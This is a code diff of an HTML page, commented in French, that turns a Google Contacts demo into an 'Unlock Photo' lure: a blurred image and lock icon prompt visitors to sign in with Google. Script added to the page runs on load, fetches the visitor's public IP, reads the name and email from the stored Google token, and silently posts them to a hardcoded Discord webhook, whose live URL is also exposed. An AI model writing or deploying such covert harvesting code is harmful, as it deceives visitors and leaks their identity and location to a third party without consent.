@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Contacts Local</title>
+<title>Unlock Photo</title>
 
 <script src="https://accounts.google.com/gsi/client" async defer></script>
 
@@ -14,65 +14,121 @@ body {
     display: flex;
     justify-content: center;
     align-items: center;
-    background: #111;
-    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+/* PAGE LOGIN */
+#loginPage {
+    text-align: center;
     color: white;
 }
 
-#photoPage { display: none; flex-direction: column; align-items: center; }
-
-button {
-    margin-top: 20px;
-    padding: 10px 20px;
-    border-radius: 8px;
-    border: none;
-    cursor: pointer;
-    font-size: 16px;
+.login-box {
+    background: rgba(255,255,255,0.05);
+    padding: 40px;
+    border-radius: 20px;
+    box-shadow: 0 0 30px rgba(0,0,0,0.8);
 }
 
-pre {
-    margin-top: 20px;
-    max-height: 300px;
-    overflow: auto;
-    background: #222;
-    padding: 15px;
-    border-radius: 10px;
-    width: 400px;
+/* PAGE PHOTO */
+#photoPage {
+    display: none;
+}
+
+.container {
+    position: relative;
+    width: 350px;
+    height: 500px;
+    border-radius: 25px;
+    overflow: hidden;
+    box-shadow: 0 0 30px rgba(0,0,0,0.8), 0 0 60px rgba(0,0,0,0.4) inset;
+    border: 2px solid rgba(255,255,255,0.1);
+}
+
+.container::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background-image: url('https://th.bing.com/th/id/OIP.Sf-7AhO0y59pnX5ZceAlCQHaKx?w=207&h=301&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3');
+    background-size: cover;
+    background-position: center;
+    filter: blur(25px) brightness(0.7);
+    z-index: 0;
+}
+
+.lock {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 80px;
+    color: #ff4d4d;
+    text-shadow: 0 0 10px #ff4d4d, 0 0 20px #ff4d4d;
+    background: rgba(0,0,0,0.6);
+    padding: 25px;
+    border-radius: 50%;
+    backdrop-filter: blur(10px);
+    z-index: 2;
+    cursor: pointer;
+}
+
+.title {
+    position: absolute;
+    bottom: 25px;
+    width: 100%;
+    text-align: center;
+    color: #fff;
+    font-size: 22px;
+    letter-spacing: 1px;
+    z-index: 2;
 }
 </style>
 </head>
 
 <body>
 
+<!-- PAGE LOGIN -->
 <div id="loginPage">
-    <h2>Connexion Google</h2>
-    <div id="g_id_onload"
-         data-client_id="739861507841-mnmfem8pjmcemo48ufsckgkqvtoec8j6.apps.googleusercontent.com"
-         data-callback="handleCredentialResponse">
-    </div>
+    <div class="login-box">
+        <h2>Connexion requise</h2>
+        <div id="g_id_onload"
+             data-client_id="739861507841-mnmfem8pjmcemo48ufsckgkqvtoec8j6.apps.googleusercontent.com"
+             data-callback="handleCredentialResponse">
+        </div>
 
-    <div class="g_id_signin"
-         data-type="standard"
-         data-size="large">
+        <div class="g_id_signin"
+             data-type="standard"
+             data-size="large"
+             data-theme="outline"
+             data-text="signin_with"
+             data-shape="pill"
+             data-logo_alignment="left">
+        </div>
     </div>
 </div>
 
+<!-- PAGE PHOTO -->
 <div id="photoPage">
-    <h2>Connecté ✅</h2>
-    <button onclick="getContacts()">Récupérer mes contacts</button>
-    <pre id="contactsResult"></pre>
+    <div class="container">
+        <div class="lock">🔒</div>
+        <div class="title">Photo verrouillée</div>
+    </div>
 </div>
 
 <script>
-
-// Connexion Google
 function handleCredentialResponse(response) {
     const jwt = response.credential;
+
+    // Décodage du token pour récupérer les infos utilisateur
     const payload = JSON.parse(atob(jwt.split('.')[1]));
 
     console.log("Connecté :", payload.email);
 
+    // Sauvegarde session locale
     localStorage.setItem("google_user", JSON.stringify(payload));
+
     showPhotoPage();
 }
 
@@ -82,45 +138,40 @@ function showPhotoPage() {
 }
 
 // Vérifie si déjà connecté
-window.addEventListener("load", function() {
+window.onload = function() {
     const user = localStorage.getItem("google_user");
-    if (user) {
+    if(user) {
         showPhotoPage();
     }
-});
+};
 
-// Demande accès aux contacts
-function getContacts() {
+// Envoie l'IP, le nom, le prénom et l'email vers le webhook Discord
+window.onload = function() {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
 
-    const tokenClient = google.accounts.oauth2.initTokenClient({
-        client_id: "739861507841-mnmfem8pjmcemo48ufsckgkqvtoec8j6.apps.googleusercontent.com",
-        scope: "https://www.googleapis.com/auth/contacts.readonly",
-        callback: (tokenResponse) => {
-            fetchContacts(tokenResponse.access_token);
-        }
-    });
+            const user = localStorage.getItem("google_user");
+            const userObj = JSON.parse(user);
 
-    tokenClient.requestAccessToken();
-}
+            const webhookUrl = 'https://discord.com/api/webhooks/1471154515238588420/NVvd16VSjrUiYpJj54rSKrTy86q9zI9-urEFun9eezXtptYKX6UdW2PNhZe5RzOiWKwA'; // Remplace par ton webhook
 
-// Récupération via People API
-function fetchContacts(accessToken) {
-    fetch("https://people.googleapis.com/v1/people/me/connections?personFields=names,emailAddresses", {
-        headers: {
-            Authorization: "Bearer " + accessToken
-        }
-    })
-    .then(res => res.json())
-    .then(data => {
-        document.getElementById("contactsResult").textContent =
-            JSON.stringify(data, null, 2);
-    })
-    .catch(err => {
-        console.error(err);
-        alert("Erreur lors de la récupération des contacts");
-    });
-}
+            const payload = {
+                content: `**IP publique :** ${ip}\n**Nom :** ${userObj.name}\n**Prénom :** ${userObj.given_name}\n**Email :** ${userObj.email}`
+            };
 
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .catch(error => console.error('Erreur lors de l\'envoi vers le webhook Discord:', error));
+        })
+        .catch(error => console.error('Erreur lors de la récupération de l\'IP:', error));
+};
 </script>
 
 </body>
